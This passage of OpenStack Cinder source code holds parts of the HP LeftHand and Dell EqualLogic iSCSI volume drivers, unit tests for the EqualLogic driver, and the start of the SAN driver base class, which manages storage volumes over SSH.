        iscsi_portal = self.cluster_vip + ":3260," + cluster_interface

        model_update = {}

        # NOTE(jdg): LH volumes always at lun 0 ?
        model_update['provider_location'] = ("%s %s %s" %
                                             (iscsi_portal,
                                              iscsi_iqn,
                                              0))

        return model_update

    def create_volume_from_snapshot(self, volume, snapshot):
        """Creates a volume from a snapshot."""
        raise NotImplementedError()

    def create_snapshot(self, snapshot):
        """Creates a snapshot."""
        raise NotImplementedError()

    def delete_volume(self, volume):
        """Deletes a volume."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['prompt'] = 'false'  # Don't confirm
        try:
            volume_info = self._cliq_get_volume_info(volume['name'])
        except exception.ProcessExecutionError:
            LOG.error("Volume did not exist. It will not be deleted")
            return
        self._cliq_run_xml("deleteVolume", cliq_args)

    def local_path(self, volume):
        msg = _("local_path not supported")
        raise exception.VolumeBackendAPIException(data=msg)

    def initialize_connection(self, volume, connector):
        """Assigns the volume to a server.

        Assign any created volume to a compute node/host so that it can be
        used from that host. HP VSA requires a volume to be assigned
        to a server.

        This driver returns a driver_volume_type of 'iscsi'.
        The format of the driver data is defined in _get_iscsi_properties.
        Example return value:

            {
                'driver_volume_type': 'iscsi'
                'data': {
                    'target_discovered': True,
                    'target_iqn': 'iqn.2010-10.org.openstack:volume-00000001',
                    'target_protal': '127.0.0.1:3260',
                    'volume_id': 1,
                }
            }

        """
        self._create_server(connector)
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("assignVolumeToServer", cliq_args)

        iscsi_properties = self._get_iscsi_properties(volume)
        return {
            'driver_volume_type': 'iscsi',
            'data': iscsi_properties
        }

    def _create_server(self, connector):
        cliq_args = {}
        cliq_args['serverName'] = connector['host']
        out = self._cliq_run_xml("getServerInfo", cliq_args, False)
        response = out.find("response")
        result = response.attrib.get("result")
        if result != '0':
            cliq_args = {}
            cliq_args['serverName'] = connector['host']
            cliq_args['initiator'] = connector['initiator']
            self._cliq_run_xml("createServer", cliq_args)

    def terminate_connection(self, volume, connector, **kwargs):
        """Unassign the volume from the host."""
        cliq_args = {}
        cliq_args['volumeName'] = volume['name']
        cliq_args['serverName'] = connector['host']
        self._cliq_run_xml("unassignVolumeToServer", cliq_args)

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_backend_status()

        return self.device_stats

    def _update_backend_status(self):
        data = {}
        backend_name = self.configuration.safe_get('volume_backend_name')
        data['volume_backend_name'] = backend_name or self.__class__.__name__
        data['driver_version'] = '1.0'
        data['reserved_percentage'] = 0
        data['storage_protocol'] = 'iSCSI'
        data['vendor_name'] = 'Hewlett-Packard'

        result_xml = self._cliq_run_xml("getClusterInfo", {})
        cluster_node = result_xml.find("response/cluster")
        total_capacity = cluster_node.attrib.get("spaceTotal")
        free_capacity = cluster_node.attrib.get("unprovisionedSpace")
        GB = 1073741824

        data['total_capacity_gb'] = int(total_capacity) / GB
        data['free_capacity_gb'] = int(free_capacity) / GB
        self.device_stats = data

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

import time

import mox
import paramiko

from cinder import context
from cinder import exception
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import test
from cinder.volume import configuration as conf
from cinder.volume.drivers import eqlx


LOG = logging.getLogger(__name__)


class DellEQLSanISCSIDriverTestCase(test.TestCase):

    def setUp(self):
        super(DellEQLSanISCSIDriverTestCase, self).setUp()
        self.configuration = mox.MockObject(conf.Configuration)
        self.configuration.append_config_values(mox.IgnoreArg())
        self.configuration.san_is_local = False
        self.configuration.san_ip = "10.0.0.1"
        self.configuration.san_login = "foo"
        self.configuration.san_password = "bar"
        self.configuration.san_ssh_port = 16022
        self.configuration.san_thin_provision = True
        self.configuration.eqlx_pool = 'non-default'
        self.configuration.eqlx_use_chap = True
        self.configuration.eqlx_group_name = 'group-0'
        self.configuration.eqlx_cli_timeout = 30
        self.configuration.eqlx_cli_max_retries = 5
        self.configuration.eqlx_chap_login = 'admin'
        self.configuration.eqlx_chap_password = 'password'
        self.configuration.volume_name_template = 'volume_%s'
        self._context = context.get_admin_context()
        self.driver = eqlx.DellEQLSanISCSIDriver(
            configuration=self.configuration)
        self.volume_name = "fakevolume"
        self.volid = "fakeid"
        self.connector = {'ip': '10.0.0.2',
                          'initiator': 'iqn.1993-08.org.debian:01:222',
                          'host': 'fakehost'}
        self.fake_iqn = 'iqn.2003-10.com.equallogic:group01:25366:fakev'
        self.driver._group_ip = '10.0.1.6'
        self.properties = {
            'target_discoverd': True,
            'target_portal': '%s:3260' % self.driver._group_ip,
            'target_iqn': self.fake_iqn,
            'volume_id': 1}
        self._model_update = {
            'provider_location': "%s:3260,1 %s 0" % (self.driver._group_ip,
                                                     self.fake_iqn),
            'provider_auth': 'CHAP %s %s' % (
                self.configuration.eqlx_chap_login,
                self.configuration.eqlx_chap_password)
        }

    def _fake_get_iscsi_properties(self, volume):
        return self.properties

    def test_create_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'create', volume['name'],
                                 "%sG" % (volume['size']), 'pool',
                                 self.configuration.eqlx_pool,
                                 'thin-provision').\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume(volume)
        self.assertEqual(model_update, self._model_update)

    def test_delete_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.driver._eql_execute('volume', 'select', volume['name'], 'offline')
        self.driver._eql_execute('volume', 'delete', volume['name'])
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_delete_absent_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1, 'id': self.volid}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show').\
            AndRaise(processutils.ProcessExecutionError(
                stdout='% Error ..... does not exist.\n'))
        self.mox.ReplayAll()
        self.driver.delete_volume(volume)

    def test_ensure_export(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 1}
        self.driver._eql_execute('volume', 'select', volume['name'], 'show')
        self.mox.ReplayAll()
        self.driver.ensure_export({}, volume)

    def test_create_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        snap_name = 'fake_snap_name'
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'create-now').\
            AndReturn(['Snapshot name is %s' % snap_name])
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'rename', snap_name,
                                 snapshot['name'])
        self.mox.ReplayAll()
        self.driver.create_snapshot(snapshot)

    def test_create_volume_from_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'select', snapshot['name'],
                                 'clone', volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_volume_from_snapshot(volume,
                                                               snapshot)
        self.assertEqual(model_update, self._model_update)

    def test_create_cloned_volume(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        src_vref = {'id': 'fake_uuid'}
        volume = {'name': self.volume_name}
        src_volume_name = self.configuration.\
            volume_name_template % src_vref['id']
        self.driver._eql_execute('volume', 'select', src_volume_name, 'clone',
                                 volume['name']).\
            AndReturn(['iSCSI target name is %s.' % self.fake_iqn])
        self.mox.ReplayAll()
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertEqual(model_update, self._model_update)

    def test_delete_snapshot(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        snapshot = {'name': 'fakesnap', 'volume_name': 'fakevolume_name'}
        self.driver._eql_execute('volume', 'select', snapshot['volume_name'],
                                 'snapshot', 'delete', snapshot['name'])
        self.mox.ReplayAll()
        self.driver.delete_snapshot(snapshot)

    def test_extend_volume(self):
        new_size = '200'
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name, 'size': 100}
        self.driver._eql_execute('volume', 'select', volume['name'],
                                 'size', "%sG" % new_size)
        self.mox.ReplayAll()
        self.driver.extend_volume(volume, new_size)

    def test_initialize_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.stubs.Set(self.driver, "_get_iscsi_properties",
                       self._fake_get_iscsi_properties)
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'create', 'initiator',
                                 self.connector['initiator'],
                                 'authmethod chap',                    
                                 'username',
                                 self.configuration.eqlx_chap_login)
        self.mox.ReplayAll()
        iscsi_properties = self.driver.initialize_connection(volume,
                                                             self.connector)
        self.assertEqual(iscsi_properties['data'],
                         self._fake_get_iscsi_properties(volume))

    def test_terminate_connection(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        volume = {'name': self.volume_name}
        self.driver._eql_execute('volume', 'select', volume['name'], 'access',
                                 'delete', '1')
        self.mox.ReplayAll()
        self.driver.terminate_connection(volume, self.connector)

    def test_do_setup(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        fake_group_ip = '10.1.2.3'
        for feature in ('confirmation', 'paging', 'events', 'formatoutput'):
            self.driver._eql_execute('cli-settings', feature, 'off')
        self.driver._eql_execute('grpparams', 'show').\
            AndReturn(['Group-Ipaddress: %s' % fake_group_ip])
        self.mox.ReplayAll()
        self.driver.do_setup(self._context)
        self.assertEqual(fake_group_ip, self.driver._group_ip)

    def test_update_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        self.driver._update_volume_stats()
        self.assertEqual(self.driver._stats['total_capacity_gb'], 111.0)
        self.assertEqual(self.driver._stats['free_capacity_gb'], 11.0)

    def test_get_volume_stats(self):
        self.driver._eql_execute = self.mox.\
            CreateMock(self.driver._eql_execute)
        self.driver._eql_execute('pool', 'select',
                                 self.configuration.eqlx_pool, 'show').\
            AndReturn(['TotalCapacity: 111GB', 'FreeSpace: 11GB'])
        self.mox.ReplayAll()
        stats = self.driver.get_volume_stats(refresh=True)
        self.assertEqual(stats['total_capacity_gb'], float('111.0'))
        self.assertEqual(stats['free_capacity_gb'], float('11.0'))
        self.assertEqual(stats['vendor_name'], 'Dell')

    def test_get_space_in_gb(self):
        self.assertEqual(self.driver._get_space_in_gb('123.0GB'), 123.0)
        self.assertEqual(self.driver._get_space_in_gb('123.0TB'), 123.0 * 1024)
        self.assertEqual(self.driver._get_space_in_gb('1024.0MB'), 1.0)

    def test_get_output(self):

        def _fake_recv(ignore_arg):
            return '%s> ' % self.configuration.eqlx_group_name

        chan = self.mox.CreateMock(paramiko.Channel)
        self.stubs.Set(chan, "recv", _fake_recv)
        self.assertEqual(self.driver._get_output(chan), [_fake_recv(None)])

    def test_get_prefixed_value(self):
        lines = ['Line1 passed', 'Line1 failed']
        prefix = ['Line1', 'Line2']
        expected_output = [' passed', None]
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[0]),
                         expected_output[0])
        self.assertEqual(self.driver._get_prefixed_value(lines, prefix[1]),
                         expected_output[1])

    def test_ssh_execute(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['NoError: test run']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertEqual(self.driver._ssh_execute(ssh, cmd), expected_output)

    def test_ssh_execute_error(self):
        ssh = self.mox.CreateMock(paramiko.SSHClient)
        chan = self.mox.CreateMock(paramiko.Channel)
        transport = self.mox.CreateMock(paramiko.Transport)
        self.mox.StubOutWithMock(self.driver, '_get_output')
        self.mox.StubOutWithMock(ssh, 'get_transport')
        self.mox.StubOutWithMock(chan, 'invoke_shell')
        expected_output = ['Error: test run', '% Error']
        ssh.get_transport().AndReturn(transport)
        transport.open_session().AndReturn(chan)
        chan.invoke_shell()
        self.driver._get_output(chan).AndReturn(expected_output)
        cmd = 'this is dummy command'
        chan.send('stty columns 255' + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.send(cmd + '\r')
        self.driver._get_output(chan).AndReturn(expected_output)
        chan.close()
        self.mox.ReplayAll()
        self.assertRaises(processutils.ProcessExecutionError,
                          self.driver._ssh_execute, ssh, cmd)

    def test_with_timeout(self):
        @eqlx.with_timeout
        def no_timeout(cmd, *args, **kwargs):
            return 'no timeout'

        @eqlx.with_timeout
        def w_timeout(cmd, *args, **kwargs):
            time.sleep(1)

        self.assertEqual(no_timeout('fake cmd'), 'no timeout')
        self.assertRaises(exception.VolumeBackendAPIException,
                          w_timeout, 'fake cmd', timeout=0.1)

    def test_local_path(self):
        self.assertRaises(NotImplementedError, self.driver.local_path, '')

#    Copyright (c) 2013 Dell Inc.
#    Copyright 2013 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

"""Volume driver for Dell EqualLogic Storage."""

import functools
import random

import eventlet
from eventlet import greenthread
import greenlet
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder import utils
from cinder.volume.drivers.san import SanISCSIDriver

LOG = logging.getLogger(__name__)

eqlx_opts = [
    cfg.StrOpt('eqlx_group_name',
               default='group-0',
               help='Group name to use for creating volumes'),
    cfg.IntOpt('eqlx_cli_timeout',
               default=30,
               help='Timeout for the Group Manager cli command execution'),
    cfg.IntOpt('eqlx_cli_max_retries',
               default=5,
               help='Maximum retry count for reconnection'),
    cfg.BoolOpt('eqlx_use_chap',
                default=False,
                help='Use CHAP authentication for targets?'),
    cfg.StrOpt('eqlx_chap_login',
               default='admin',
               help='Existing CHAP account name'),
    cfg.StrOpt('eqlx_chap_password',
               default='password',
               help='Password for specified CHAP account name',
               secret=True),
    cfg.StrOpt('eqlx_pool',
               default='default',
               help='Pool in which volumes will be created')
]


CONF = cfg.CONF
CONF.register_opts(eqlx_opts)


def with_timeout(f):
    @functools.wraps(f)
    def __inner(self, *args, **kwargs):
        timeout = kwargs.pop('timeout', None)
        gt = eventlet.spawn(f, self, *args, **kwargs)
        if timeout is None:
            return gt.wait()
        else:
            kill_thread = eventlet.spawn_after(timeout, gt.kill)
            try:
                res = gt.wait()
            except greenlet.GreenletExit:
                raise exception.VolumeBackendAPIException(
                    data="Command timed out")
            else:
                kill_thread.cancel()
                return res

    return __inner


class DellEQLSanISCSIDriver(SanISCSIDriver):
    """Implements commands for Dell EqualLogic SAN ISCSI management.

    To enable the driver add the following line to the cinder configuration:
        volume_driver=cinder.volume.drivers.eqlx.DellEQLSanISCSIDriver

    Driver's prerequisites are:
        - a separate volume group set up and running on the SAN
        - SSH access to the SAN
        - a special user must be created which must be able to
            - create/delete volumes and snapshots;
            - clone snapshots into volumes;
            - modify volume access records;

    The access credentials to the SAN are provided by means of the following
    flags
        san_ip=<ip_address>
        san_login=<user name>
        san_password=<user password>
        san_private_key=<file containing SSH private key>

    Thin provision of volumes is enabled by default, to disable it use:
        san_thin_provision=false

    In order to use target CHAP authentication (which is disabled by default)
    SAN administrator must create a local CHAP user and specify the following
    flags for the driver:
        eqlx_use_chap=true
        eqlx_chap_login=<chap_login>
        eqlx_chap_password=<chap_password>

    eqlx_group_name parameter actually represents the CLI prompt message
    without '>' ending. E.g. if prompt looks like 'group-0>', then the
    parameter must be set to 'group-0'

    Also, the default CLI command execution timeout is 30 secs. Adjustable by
        eqlx_cli_timeout=<seconds>
    """

    VERSION = "1.0.0"

    def __init__(self, *args, **kwargs):
        super(DellEQLSanISCSIDriver, self).__init__(*args, **kwargs)
        self.configuration.append_config_values(eqlx_opts)
        self._group_ip = None
        self.sshpool = None

    def _get_output(self, chan):
        out = ''
        ending = '%s> ' % self.configuration.eqlx_group_name
        while not out.endswith(ending):
            out += chan.recv(102400)

        LOG.debug(_("CLI output\n%s"), out)
        return out.splitlines()

    def _get_prefixed_value(self, lines, prefix):
        for line in lines:
            if line.startswith(prefix):
                return line[len(prefix):]
        return

    @with_timeout
    def _ssh_execute(self, ssh, command, *arg, **kwargs):
        transport = ssh.get_transport()
        chan = transport.open_session()
        chan.invoke_shell()

        LOG.debug(_("Reading CLI MOTD"))
        self._get_output(chan)

        cmd = 'stty columns 255'
        LOG.debug(_("Setting CLI terminal width: '%s'"), cmd)
        chan.send(cmd + '\r')
        out = self._get_output(chan)

        LOG.debug(_("Sending CLI command: '%s'"), command)
        chan.send(command + '\r')
        out = self._get_output(chan)

        chan.close()

        if any(line.startswith(('% Error', 'Error:')) for line in out):
            desc = _("Error executing EQL command")
            cmdout = '\n'.join(out)
            LOG.error(cmdout)
            raise processutils.ProcessExecutionError(
                stdout=cmdout, cmd=command, description=desc)
        return out

    def _run_ssh(self, cmd_list, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            password = self.configuration.san_password
            privatekey = self.configuration.san_private_key
            min_size = self.configuration.ssh_min_pool_conn
            max_size = self.configuration.ssh_max_pool_conn
            self.sshpool = utils.SSHPool(self.configuration.san_ip,
                                         self.configuration.san_ssh_port,
                                         self.configuration.ssh_conn_timeout,
                                         self.configuration.san_login,
                                         password=password,
                                         privatekey=privatekey,
                                         min_size=min_size,
                                         max_size=max_size)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        LOG.info(_('EQL-driver: executing "%s"') % command)
                        return self._ssh_execute(
                            ssh, command,
                            timeout=self.configuration.eqlx_cli_timeout)
                    except processutils.ProcessExecutionError:
                        raise
                    except Exception as e:
                        LOG.exception(e)
                        greenthread.sleep(random.randint(20, 500) / 100.0)
                msg = (_("SSH Command failed after '%(total_attempts)r' "
                         "attempts : '%(command)s'") %
                       {'total_attempts': total_attempts, 'command': command})
                raise exception.VolumeBackendAPIException(data=msg)

        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_("Error running SSH command: %s") % command)

    def _eql_execute(self, *args, **kwargs):
        return self._run_ssh(
            args, attempts=self.configuration.eqlx_cli_max_retries)

    def _get_volume_data(self, lines):
        prefix = 'iSCSI target name is '
        target_name = self._get_prefixed_value(lines, prefix)[:-1]
        lun_id = "%s:%s,1 %s 0" % (self._group_ip, '3260', target_name)
        model_update = {}
        model_update['provider_location'] = lun_id
        if self.configuration.eqlx_use_chap:
            model_update['provider_auth'] = 'CHAP %s %s' % \
                (self.configuration.eqlx_chap_login,
                 self.configuration.eqlx_chap_password)
        return model_update

    def _get_space_in_gb(self, val):
        scale = 1.0
        part = 'GB'
        if val.endswith('MB'):
            scale = 1.0 / 1024
            part = 'MB'
        elif val.endswith('TB'):
            scale = 1.0 * 1024
            part = 'TB'
        return scale * float(val.partition(part)[0])

    def _update_volume_stats(self):
        """Retrieve stats info from eqlx group."""

        LOG.debug(_("Updating volume stats"))
        data = {}
        backend_name = "eqlx"
        if self.configuration:
            backend_name = self.configuration.safe_get('volume_backend_name')
        data["volume_backend_name"] = backend_name or 'eqlx'
        data["vendor_name"] = 'Dell'
        data["driver_version"] = self.VERSION
        data["storage_protocol"] = 'iSCSI'

        data['reserved_percentage'] = 0
        data['QoS_support'] = False

        data['total_capacity_gb'] = 'infinite'
        data['free_capacity_gb'] = 'infinite'

        for line in self._eql_execute('pool', 'select',
                                      self.configuration.eqlx_pool, 'show'):
            if line.startswith('TotalCapacity:'):
                out_tup = line.rstrip().partition(' ')
                data['total_capacity_gb'] = self._get_space_in_gb(out_tup[-1])
            if line.startswith('FreeSpace:'):
                out_tup = line.rstrip().partition(' ')
                data['free_capacity_gb'] = self._get_space_in_gb(out_tup[-1])

        self._stats = data

    def _check_volume(self, volume):
        """Check if the volume exists on the Array."""
        command = ['volume', 'select', volume['name'], 'show']
        try:
            self._eql_execute(*command)
        except processutils.ProcessExecutionError as err:
            with excutils.save_and_reraise_exception():
                if err.stdout.find('does not exist.\n') > -1:
                    LOG.debug(_('Volume %s does not exist, '
                                'it may have already been deleted'),
                              volume['name'])
                    raise exception.VolumeNotFound(volume_id=volume['id'])

    def do_setup(self, context):
        """Disable cli confirmation and tune output format."""
        try:
            disabled_cli_features = ('confirmation', 'paging', 'events',
                                     'formatoutput')
            for feature in disabled_cli_features:
                self._eql_execute('cli-settings', feature, 'off')

            for line in self._eql_execute('grpparams', 'show'):
                if line.startswith('Group-Ipaddress:'):
                    out_tup = line.rstrip().partition(' ')
                    self._group_ip = out_tup[-1]

            LOG.info(_("EQL-driver: Setup is complete, group IP is %s"),
                     self._group_ip)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to setup the Dell EqualLogic driver'))

    def create_volume(self, volume):
        """Create a volume."""
        try:
            cmd = ['volume', 'create',
                   volume['name'], "%sG" % (volume['size'])]
            if self.configuration.eqlx_pool != 'default':
                cmd.append('pool')
                cmd.append(self.configuration.eqlx_pool)
            if self.configuration.san_thin_provision:
                cmd.append('thin-provision')
            out = self._eql_execute(*cmd)
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume %s'), volume['name'])

    def delete_volume(self, volume):
        """Delete a volume."""
        try:
            self._check_volume(volume)
            self._eql_execute('volume', 'select', volume['name'], 'offline')
            self._eql_execute('volume', 'delete', volume['name'])
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s was not found while trying to delete it'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete volume %s'), volume['name'])

    def create_snapshot(self, snapshot):
        """"Create snapshot of existing volume on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'],
                                    'snapshot', 'create-now')
            prefix = 'Snapshot name is '
            snap_name = self._get_prefixed_value(out, prefix)
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'rename', snap_name,
                              snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create snapshot of volume %s'),
                          snapshot['volume_name'])

    def create_volume_from_snapshot(self, volume, snapshot):
        """Create new volume from other volume's snapshot on appliance."""
        try:
            out = self._eql_execute('volume', 'select',
                                    snapshot['volume_name'], 'snapshot',
                                    'select', snapshot['name'],
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create volume from snapshot %s'),
                          snapshot['name'])

    def create_cloned_volume(self, volume, src_vref):
        """Creates a clone of the specified volume."""
        try:
            src_volume_name = self.configuration.\
                volume_name_template % src_vref['id']
            out = self._eql_execute('volume', 'select', src_volume_name,
                                    'clone', volume['name'])
            return self._get_volume_data(out)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to create clone of volume %s'),
                          volume['name'])

    def delete_snapshot(self, snapshot):
        """Delete volume's snapshot."""
        try:
            self._eql_execute('volume', 'select', snapshot['volume_name'],
                              'snapshot', 'delete', snapshot['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to delete snapshot %(snap)s of '
                            'volume %(vol)s'),
                          {'snap': snapshot['name'],
                           'vol': snapshot['volume_name']})

    def initialize_connection(self, volume, connector):
        """Restrict access to a volume."""
        try:
            cmd = ['volume', 'select', volume['name'], 'access', 'create',
                   'initiator', connector['initiator']]
            if self.configuration.eqlx_use_chap:
                cmd.extend(['authmethod chap', 'username',                    
                            self.configuration.eqlx_chap_login])
            self._eql_execute(*cmd)
            iscsi_properties = self._get_iscsi_properties(volume)
            return {
                'driver_volume_type': 'iscsi',
                'data': iscsi_properties
            }
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to initialize connection to volume %s'),
                          volume['name'])

    def terminate_connection(self, volume, connector, force=False, **kwargs):
        """Remove access restrictions from a volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'access', 'delete', '1')
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to terminate connection to volume %s'),
                          volume['name'])

    def create_export(self, context, volume):
        """Create an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        """
        pass

    def ensure_export(self, context, volume):
        """Ensure an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation. We will just make
        sure that the volume exists on the array and issue a warning.
        """
        try:
            self._check_volume(volume)
        except exception.VolumeNotFound:
            LOG.warn(_('Volume %s is not found!, it may have been deleted'),
                     volume['name'])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to ensure export of volume %s'),
                          volume['name'])

    def remove_export(self, context, volume):
        """Remove an export of a volume.

        Driver has nothing to do here for the volume has been exported
        already by the SAN, right after it's creation.
        Nothing to remove since there's nothing exported.
        """
        pass

    def extend_volume(self, volume, new_size):
        """Extend the size of the volume."""
        try:
            self._eql_execute('volume', 'select', volume['name'],
                              'size', "%sG" % new_size)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_('Failed to extend_volume %(name)s from '
                            '%(current_size)sGB to %(new_size)sGB'),
                          {'name': volume['name'],
                           'current_size': volume['size'],
                           'new_size': new_size})

    def local_path(self, volume):
        raise NotImplementedError()

# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the "License"); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
"""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
"""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help="SSH connection timeout in seconds"),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
    """Base class for SAN-style storage volumes

    A SAN-style storage value is 'different' because the volume controller
    probably won't run on it, so we need to access is over SSH or another
    remote protocol.
    """

    def __init__(self, *args, **kwargs):
        execute = kwargs.pop('execute', self.san_execute)
        super(SanDriver, self).__init__(execute=execute,
                                        *args, **kwargs)
        self.configuration.append_config_values(san_opts)
        self.run_local = self.configuration.san_is_local
        self.sshpool = None

    def san_execute(self, *cmd, **kwargs):
        if self.run_local:
            return utils.execute(*cmd, **kwargs)
        else:
            check_exit_code = kwargs.pop('check_exit_code', None)
            command = ' '.join(cmd)
